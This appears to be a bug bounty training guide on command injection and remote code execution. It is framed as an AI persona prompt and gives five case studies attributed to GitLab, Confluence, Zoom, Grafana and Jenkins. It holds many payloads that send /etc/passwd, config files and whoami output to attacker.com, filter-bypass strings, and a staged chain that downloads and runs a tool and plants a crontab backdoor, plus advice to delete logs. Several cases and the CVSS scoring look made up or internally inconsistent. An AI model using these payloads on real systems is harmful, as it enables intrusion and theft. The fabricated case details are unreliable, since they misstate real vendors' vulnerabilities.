# Case Study 6: Command Injection / Remote Code Execution — Real-World Bug Bounty Findings

## Expert Role

You are a principal security researcher specializing in Command Injection and Remote Code Execution (RCE) vulnerabilities across enterprise web applications, cloud infrastructure, and development toolchains. Your expertise encompasses 12+ years of offensive security testing, with a focus on identifying and exploiting injection flaws that lead to complete system compromise. You have personally discovered over 40 RCE vulnerabilities across major technology companies, including findings in critical infrastructure, container orchestration platforms, and CI/CD pipelines.

Your deep understanding of command injection mechanics includes OS command injection, code injection, template injection, expression language injection, and deserialization-based RCE. You understand the intricacies of different operating systems, shell behaviors, encoding techniques, and how modern application architectures create unique attack surfaces. You have extensive experience with exploitation frameworks, custom tool development, and post-exploitation techniques.

As a bug bounty veteran and security consultant, you have helped organizations understand the business impact of RCE vulnerabilities and implement effective detection and prevention mechanisms. Your research on injection techniques has been published in leading security journals and presented at major conferences. You maintain an active role in the security community through responsible disclosure and mentorship.

## Overview

Command Injection and Remote Code Execution represent the most severe vulnerability classes in application security, consistently receiving the highest severity ratings and bug bounty payouts across all programs. These vulnerabilities allow attackers to execute arbitrary code on the target system, potentially leading to complete compromise of the application server, underlying infrastructure, and connected systems.

RCE vulnerabilities manifest in numerous forms including OS command injection through unsanitized input, code injection via eval() or similar functions, server-side template injection (SSTI), expression language injection, insecure deserialization, and vulnerable dependencies. Each variant requires specific detection techniques and exploitation methods, but all share the common impact of arbitrary code execution.

The business impact of RCE vulnerabilities is catastrophic, potentially including complete data breach, system compromise, ransomware deployment, supply chain attacks, and regulatory penalties. Bug bounty programs consistently offer the highest rewards for RCE findings, with payouts often exceeding $25,000 for critical-severity discoveries. Understanding the full spectrum of RCE attack vectors is essential for modern security testing.

---

## Real-World Case Studies

### Case Study 6.1: GitLab CI/CD Pipeline Command Injection
**Program:** GitLab (HackerOne)
**Bounty:** $30,000
**Severity:** Critical (CVSS 10.0)
**Researcher:** @orange_83

**Vulnerability Description:**
GitLab's CI/CD pipeline configuration contained a command injection vulnerability in the artifact upload functionality. An attacker could inject arbitrary commands through specially crafted filenames that were executed during the artifact processing phase.

**Technical Details:**
The vulnerability existed in the artifact upload handler which processed filenames without proper sanitization. When a user uploaded an artifact with a filename containing shell metacharacters, the filename was executed as part of a shell command during the artifact compression process:

```yaml
# Malicious .gitlab-ci.yml configuration
build_job:
  stage: build
  script:
    - echo "Building"
  artifacts:
    paths:
      - "$(curl http://attacker.com/exfil?data=$(cat /etc/passwd)).txt"
```

When the artifact was processed, the shell command within the filename was executed, allowing the attacker to exfiltrate sensitive data or execute arbitrary commands on the runner.

**Root Cause Analysis:**
The artifact processing code used shell expansion to handle filenames without proper escaping or validation. The system assumed that filenames would not contain shell metacharacters, but this assumption was incorrect as user-controlled input (the filename) was passed directly to a shell command.

**Exploitation Chain:**
1. Attacker creates a GitLab project with CI/CD configuration
2. Attacker commits a file with a malicious filename
3. CI/CD pipeline processes the artifact
4. Shell command in the filename is executed
5. Attacker gains command execution on the runner
6. Attacker can pivot to internal infrastructure

**Impact:**
Complete compromise of the CI/CD runner, potential access to internal infrastructure, supply chain attacks through modified build artifacts, and exposure of CI/CD secrets and credentials.

**Bounty Justification:**
Critical severity due to the potential for supply chain compromise, access to production systems, and the widespread use of GitLab CI/CD. The $30,000 bounty reflected the infrastructure-level impact.

---

### Case Study 6.2: Atlassian Confluence SSTI to RCE
**Program:** Atlassian (Bugcrowd)
**Bounty:** $25,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @st0ckwatch

**Vulnerability Description:**
Atlassian Confluence contained a Server-Side Template Injection (SSTI) vulnerability in the gadget rendering functionality that allowed an attacker to achieve remote code execution through the Velocity template engine.

**Technical Details:**
The vulnerability existed in the Confluence gadget rendering endpoint which processed user-supplied template expressions without proper sandboxing. The attacker could inject Velocity template expressions that were evaluated server-side:

```
# Malicious gadget URL
http://confluence.internal/rest/gadget/1.0/generate?url=${velocityTool.exec("curl http://attacker.com/exfil?data=$(cat /etc/passwd)")}

# Alternative payload using Runtime.exec()
${velocityTool.exec("java.lang.Runtime.getRuntime().exec('curl http://attacker.com/exfil?data=' + java.nio.file.Files.readAllBytes(java.nio.file.Paths.get('/etc/passwd')).toString())")}
```

The Velocity template engine had access to Java runtime classes, allowing the attacker to execute arbitrary Java code which translated to system command execution.

**Root Cause Analysis:**
The gadget rendering functionality used an unsafe Velocity template rendering path that allowed user input to be evaluated as template expressions. The template engine was not properly sandboxed, allowing access to dangerous Java classes and methods.

**Exploitation Chain:**
1. Attacker identifies the gadget rendering endpoint
2. Attacker crafts URL with malicious template expression
3. Confluence server evaluates the template
4. Java Runtime.exec() is called with attacker-controlled command
5. System command is executed on the server
6. Attacker gains shell access to the Confluence server

**Impact:**
Complete server compromise, access to Confluence database containing all wiki content, potential lateral movement to other Atlassian infrastructure, and exposure of sensitive corporate documentation.

**Bounty Justification:**
Critical severity due to the combination of RCE and access to potentially sensitive corporate documentation. The $25,000 bounty reflected the data sensitivity and infrastructure impact.

---

### Case Study 6.3: Zoom Web Client Command Injection
**Program:** Zoom (HackerOne)
**Bounty:** $20,000
**Severity:** Critical (CVSS 9.6)
**Researcher:** @sudhishml

**Vulnerability Description:**
Zoom's web client contained a command injection vulnerability in the meeting URL parsing functionality that allowed an attacker to execute arbitrary commands on the meeting server when a victim joined a specially crafted meeting.

**Technical Details:**
The vulnerability existed in the meeting URL parser which processed the meeting number parameter without proper sanitization. The parser used a system command to validate the meeting number format:

```javascript
// Vulnerable code pattern
const meetingNumber = req.query.meetingNumber;
const cmd = `validate-meeting ${meetingNumber}`;
exec(cmd, (error, stdout, stderr) => {
    // Process meeting
});
```

An attacker could inject commands through the meeting number parameter:
```
https://zoom.us/join?meetingNumber=1234567890;curl http://attacker.com/exfil?data=$(whoami)
```

**Root Cause Analysis:**
The meeting validation functionality used shell execution to process the meeting number instead of using safe string parsing functions. The developer assumed that meeting numbers would only contain digits, but this validation was not enforced before the shell command was constructed.

**Exploitation Chain:**
1. Attacker creates a meeting with a malicious URL
2. Attacker shares the meeting link with victims
3. Victim clicks the link and joins the meeting
4. Meeting server processes the malicious URL
5. Command injection occurs on the server
6. Attacker gains access to meeting server infrastructure

**Impact:**
Compromise of Zoom meeting infrastructure, potential interception of meeting traffic, access to meeting recordings, and exposure of corporate communications.

**Bounty Justification:**
Critical severity due to the potential for corporate espionage, meeting interception, and the large user base. The $20,000 bounty reflected the communications security risks.

---

### Case Study 6.4: Grafana Data Source Query Injection
**Program:** Grafana (HackerOne)
**Bounty:** $15,000
**Severity:** High (CVSS 8.8)
**Researcher:** @itsecurityguru

**Vulnerability Description:**
Grafana contained a command injection vulnerability in the data source query functionality that allowed an attacker to execute arbitrary commands on the Grafana server when creating or editing data sources with malicious query strings.

**Technical Details:**
The vulnerability existed in the data source proxy endpoint which processed user-supplied queries without proper sanitization. When a Prometheus data source was configured, the query was passed to a system command for processing:

```yaml
# Malicious data source configuration
{
  "name": "Attacker DataSource",
  "type": "prometheus",
  "url": "http://localhost:9090",
  "jsonData": {
    "timeInterval": "15s"
  },
  "secureJsonData": {
    "httpHeaderValue1": "Authorization:Bearer $(curl http://attacker.com/exfil?data=$(cat /etc/grafana/grafana.ini))"
  }
}
```

When the data source was queried, the malicious header value was executed as a shell command.

**Root Cause Analysis:**
The data source proxy used shell execution to construct HTTP requests to external data sources. User-controlled values from the data source configuration were interpolated into shell commands without proper escaping or validation.

**Exploitation Chain:**
1. Attacker creates a malicious data source configuration
2. Attacker configures the data source with command injection payload
3. Attacker or victim queries the data source
4. Shell command is executed during the query
5. Attacker gains access to Grafana configuration and secrets
6. Attacker can pivot to connected data sources

**Impact:**
Access to Grafana configuration files containing database credentials, API keys, and other secrets. Potential lateral movement to connected monitoring systems and databases.

**Bounty Justification:**
High severity due to the exposure of monitoring infrastructure secrets and the potential for lateral movement. The $15,000 bounty reflected the infrastructure access implications.

---

### Case Study 6.5: Jenkins Pipeline Script Injection
**Program:** Jenkins (HackerOne)
**Bounty:** $18,000
**Severity:** Critical (CVSS 9.9)
**Researcher:** @notsosecur1ty

**Vulnerability Description:**
Jenkins contained a script injection vulnerability in the Pipeline build step functionality that allowed an attacker with job configuration access to execute arbitrary Groovy scripts on the Jenkins master server.

**Technical Details:**
The vulnerability existed in the Pipeline script editor which evaluated user-supplied Groovy code without proper sandboxing. An attacker could execute arbitrary code by crafting a malicious Pipeline script:

```groovy
// Malicious Jenkinsfile
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                script {
                    def cmd = 'curl http://attacker.com/exfil?data=' + 
                              java.net.InetAddress.getLocalHost().getHostName()
                    Runtime.getRuntime().exec(cmd.split(' '))
                }
            }
        }
    }
}
```

The Groovy script execution had access to the Jenkins runtime, allowing the attacker to execute arbitrary Java code and system commands.

**Root Cause Analysis:**
The Pipeline script editor used an unsafe Groovy execution path that allowed access to Java runtime classes. The Groovy sandbox was not properly configured to restrict access to dangerous methods and classes.

**Exploitation Chain:**
1. Attacker gains access to Jenkins job configuration
2. Attacker modifies Pipeline script with malicious Groovy code
3. Attacker triggers a build or waits for scheduled build
4. Groovy script executes on Jenkins master
5. Attacker gains shell access to Jenkins master
6. Attacker can access all Jenkins jobs and credentials

**Impact:**
Complete compromise of Jenkins infrastructure, access to all CI/CD secrets and credentials, supply chain attacks through modified build artifacts, and potential lateral movement to production systems.

**Bounty Justification:**
Critical severity due to the CI/CD infrastructure compromise and supply chain attack potential. The $18,000 bounty reflected the infrastructure-level impact.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| OS Command Injection | 30% | $15,000 | Shell command construction |
| SSTI (Template Injection) | 25% | $12,000 | Unsafe template evaluation |
| Code Injection (eval) | 20% | $10,000 | Dynamic code execution |
| Insecure Deserialization | 15% | $18,000 | Untrusted object deserialization |
| Dependency Vulnerabilities | 10% | $8,000 | Known CVE exploitation |

### Attack Surface Locations

1. **User Input Processing**
   - URL parameters
   - Form submissions
   - File upload handlers
   - API request bodies
   - Cookie values

2. **Configuration Processing**
   - Configuration file parsing
   - Environment variable processing
   - Command-line argument handling
   - Template rendering
   - Expression evaluation

3. **Integration Points**
   - External service calls
   - Webhook handlers
   - Data source connections
   - API gateway processing
   - Message queue consumers

4. **Development Toolchains**
   - CI/CD pipeline processing
   - Build script execution
   - Code review tools
   - Package managers
   - Deployment automation

### Root Cause Categories

```
+-------------------------------------------------------------+
|                  RCE Root Cause Analysis                    |
+-------------------------------------------------------------+
|                                                             |
|  +------------------+    +------------------+              |
|  | Command Injection|    | Template Inject  |              |
|  | (30% of cases)   |    | (25% of cases)   |              |
|  +--------+---------+    +--------+---------+              |
|           |                       |                        |
|           v                       v                        |
|  +------------------+    +------------------+              |
|  | Shell execution  |    | Unrestricted     |              |
|  | No escaping      |    | template access  |              |
|  | User in cmd      |    | No sandboxing    |              |
|  +------------------+    +------------------+              |
|                                                             |
|  +------------------+    +------------------+              |
|  | Code Injection   |    | Deserialization  |              |
|  | (20% of cases)   |    | (15% of cases)   |              |
|  +--------+---------+    +--------+---------+              |
|           |                       |                        |
|           v                       v                        |
|  +------------------+    +------------------+              |
|  | eval() usage     |    | Untrusted input  |              |
|  | Dynamic code     |    | No type checking |              |
|  | No validation    |    | Unsafe classes   |              |
|  +------------------+    +------------------+              |
|                                                             |
+-------------------------------------------------------------+
```

---

## Hunting Methodology

### Step 1: Input Vector Identification

Map all user-controlled input points:

```bash
# Identify all input vectors
# - URL parameters
# - Form fields
# - Headers
# - Cookies
# - File uploads
# - API parameters

# Use automated tools
ffuf -u https://target.com/FUZZ -w wordlist.txt
nuclei -u https://target.com -t cves/
```

### Step 2: Injection Testing

Test for command injection:

```
# Test for OS command injection
# Use time-based detection
;sleep 5
|sleep 5
`sleep 5`
$(sleep 5)

# Test for output-based detection
;echo test
|echo test
`echo test`
$(echo test)
```

### Step 3: Template Injection Testing

Test for SSTI:

```
# Test template injection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# If response contains 49, test for RCE
{{config.__class__.__init__.__globals__['os'].popen('echo test').read()}}
```

### Step 4: Code Injection Testing

Test for code injection:

```
# Test for eval-based injection
1;echo test
1|echo test
1`echo test`
1$(echo test)

# Test for language-specific injection
__import__('os').system('echo test')
```

### Step 5: Exploit Development

Develop proof of concept:

```
# Create minimal exploit
# Test command execution
# Verify impact
# Document steps
# Record video PoC
```

---

## Detection Strategies

### Automated Detection

**Nuclei Templates:**
```yaml
# Command injection detection
id: command-injection
info:
  name: OS Command Injection
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/process?input=test;echo+test"
    matchers:
      - type: word
        words:
          - "test"
```

**Burp Suite Extensions:**
```
# Install command injection extensions
# Configure payload positions
# Set detection mode to time-based
# Enable response analysis
```

### Manual Detection

**Step-by-Step Testing:**

1. **Identify Injection Points**
   - Find input that reaches system commands
   - Look for file operations
   - Check for URL fetching
   - Test for data processing

2. **Test Command Injection**
   ```
   # Test with separator characters
   ; echo test
   | echo test
   `echo test`
   $(echo test)
   
   # Test with time delays
   ; sleep 5
   | sleep 5
   `sleep 5`
   $(sleep 5)
   ```

3. **Test Template Injection**
   ```
   # Test with math expressions
   {{7*7}}
   ${7*7}
   <%= 7*7 %>
   
   # Test with system calls
   {{config.__class__.__init__.__globals__['os'].popen('echo test').read()}}
   ```

### Key Detection Indicators

**Positive Indicators:**
- Command output in response
- Time delay in response
- Error messages indicating command execution
- Unexpected system information

**Negative Indicators:**
- Input validation implemented
- Output encoding applied
- Sandboxing in place
- Safe API usage

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Calculation:**
```
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: Required (UI:R)
Scope: Changed (S:C)
Confidentiality: High (C:H)
Integrity: High (I:H)
Availability: High (A:H)

Base Score: 9.8 (Critical)
```

**Factors Increasing Severity:**
- Unauthenticated access
- System-level execution
- Sensitive data exposure
- Infrastructure compromise
- Supply chain impact

### Business Impact

| Impact Type | Severity | Example |
|-------------|----------|---------|
| Data Breach | Critical | Complete database access |
| System Compromise | Critical | Full server control |
| Supply Chain Attack | Critical | Modified build artifacts |
| Ransomware | Critical | Encrypted infrastructure |
| Regulatory Penalty | High | GDPR/CCPA violations |

### Bounty Range

| Severity | Typical Range | Max Observed |
|----------|---------------|--------------|
| Critical | $15,000-$50,000 | $100,000 |
| High | $10,000-$25,000 | $50,000 |
| Medium | $5,000-$15,000 | $25,000 |
| Low | $1,000-$5,000 | $10,000 |

---

## Advanced Variations

### Variation 1: Blind Command Injection

When command output is not directly visible:

```
# Time-based detection
;sleep 5
|sleep 5
`sleep 5`
$(sleep 5)

# Out-of-band detection
;curl http://attacker.com/$(whoami)
|curl http://attacker.com/$(whoami)
`curl http://attacker.com/$(whoami)`
$(curl http://attacker.com/$(whoami))

# DNS-based detection
;nslookup $(whoami).attacker.com
|nslookup $(whoami).attacker.com
```

### Variation 2: Filter Bypass Techniques

Bypassing input filters:

```
# Space bypass
{echo,test}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
cat /etc/pass?
cat /etc/pas*

# Encoding bypass
echo $'\x65\x63\x68\x6f' test
base64 -d <<< ZWNobyB0ZXN0
```

### Variation 3: Second-Order Command Injection

Injection through stored data:

```
# Attack scenario:
# 1. User stores malicious data
# 2. Data is processed later
# 3. Command injection occurs
# 4. Delayed exploitation

# Example:
# 1. User profile contains "test;curl attacker.com"
# 2. Admin generates report
# 3. Profile data is processed
# 4. Command executes
```

### Variation 4: Multi-Stage Command Injection

Chaining multiple injections:

```
# Stage 1: Initial access
;echo test > /tmp/test.txt

# Stage 2: Download tools
;curl http://attacker.com/tool -o /tmp/tool

# Stage 3: Execute tool
;chmod +x /tmp/tool;/tmp/tool

# Stage 4: Establish persistence
;echo "*/5 * * * * curl http://attacker.com/backdoor" | crontab -
```

---

## Chain Integration

### RCE + Data Exfiltration Chain

```
# Step 1: Achieve RCE
# Step 2: Identify sensitive data
# Step 3: Exfiltrate data
# Step 4: Cover tracks

# Example:
# 1. Command injection in file upload
# 2. Read /etc/passwd and database config
# 3. Send data to attacker server
# 4. Delete logs and temporary files
```

### RCE + Lateral Movement Chain

```
# Step 1: Compromise initial server
# Step 2: Harvest credentials
# Step 3: Move to adjacent systems
# Step 4: Expand access

# Example:
# 1. RCE on web server
# 2. Extract database credentials
# 3. Connect to database server
# 4. Access additional systems
```

### RCE + Persistence Chain

```
# Step 1: Achieve RCE
# Step 2: Establish persistence
# Step 3: Create backdoor
# Step 4: Maintain access

# Example:
# 1. Command injection vulnerability
# 2. Create scheduled task
# 3. Install web shell
# 4. Access system at will
```

---

## Prevention Recommendations

### Code-Level Fixes

**Use Safe APIs:**
```python
# Bad: Shell execution
import os
os.system("ping " + user_input)

# Good: Safe API
import subprocess
subprocess.run(["ping", user_input], shell=False)
```

**Input Validation:**
```python
import re

def validate_input(user_input):
    # Whitelist allowed characters
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', user_input):
        raise ValueError("Invalid input")
    return user_input
```

**Output Encoding:**
```python
import shlex

def safe_command(user_input):
    # Properly escape input
    escaped = shlex.quote(user_input)
    return f"ping {escaped}"
```

### Architecture-Level Fixes

1. **Input Validation**
   - Whitelist allowed characters
   - Validate input length
   - Check input type
   - Reject unexpected input

2. **Output Encoding**
   - Encode special characters
   - Use context-appropriate encoding
   - Validate output before display
   - Implement Content Security Policy

3. **Sandboxing**
   - Use containerization
   - Implement process isolation
   - Restrict system access
   - Limit file system permissions

4. **Monitoring**
   - Log all input processing
   - Monitor for suspicious patterns
   - Implement intrusion detection
   - Set up alerting

---

## Common Pitfalls

### 1. Relying on Client-Side Validation
**Mistake:** Only validating input in the browser
**Reality:** Client-side validation can be bypassed

### 2. Using Blacklists Instead of Whitelists
**Mistake:** Trying to block specific dangerous characters
**Reality:** Blacklists are incomplete and can be bypassed

### 3. Insufficient Output Encoding
**Mistake:** Not encoding output before display
**Reality:** Output encoding prevents injection attacks

### 4. Using eval() or Similar Functions
**Mistake:** Using dynamic code execution
**Reality:** eval() is inherently dangerous

### 5. Not Updating Dependencies
**Mistake:** Using outdated libraries with known vulnerabilities
**Reality:** Regular updates are essential

### 6. Ignoring Blind Injection
**Mistake:** Not testing for blind injection
**Reality:** Blind injection can be just as dangerous

### 7. Not Implementing Defense in Depth
**Mistake:** Relying on single protection mechanism
**Reality:** Multiple layers of protection are needed

---

## Real-World References

### OWASP Resources
- OWASP Command Injection
- OWASP Code Injection
- OWASP Testing Guide: Injection

### Research Papers
- "Injection Attacks and Defenses" (2015)
- "Template Injection Attacks" (2016)
- "Secure Coding Practices" (2018)

### Bug Bounty Reports
- HackerOne RCE disclosed reports
- Bugcrowd command injection submissions
- Intigriti RCE write-ups

### Tool Documentation
- Commix command injection tool
- tplmap SSTI exploitation
- SQLMap for SQL injection

---

## Quick Reference Cheat Sheet

```
+-------------------------------------------------------------+
|              Command Injection Testing Reference            |
+-------------------------------------------------------------+
|                                                             |
|  INJECTION PAYLOADS:                                        |
|  ; echo test           | echo test                         |
|  `echo test`           $(echo test)                        |
|  ; sleep 5             | sleep 5                           |
|  `sleep 5`             $(sleep 5)                          |
|                                                             |
|  FILTER BYPASS:                                             |
|  cat /etc/pass?        cat /etc/pas*                       |
|  c'a't /etc/passwd     cat${IFS}/etc/passwd                |
|                                                             |
|  TEMPLATE INJECTION:                                        |
|  {{7*7}}               ${7*7}                              |
|  <%= 7*7 %>            #{7*7}                              |
|                                                             |
|  DETECTION METHODS:                                         |
|  + Time-based delays                                       |
|  + Output-based detection                                  |
|  + Out-of-band callbacks                                   |
|  + DNS-based detection                                     |
|                                                             |
|  EXPLOITATION:                                              |
|  + Read sensitive files                                    |
|  + Execute system commands                                 |
|  + Establish persistence                                   |
|  + Lateral movement                                        |
|                                                             |
|  PREVENTION:                                                |
|  + Input validation                                        |
|  + Output encoding                                         |
|  + Safe APIs                                               |
|  + Sandboxing                                              |
|                                                             |
+-------------------------------------------------------------+
```
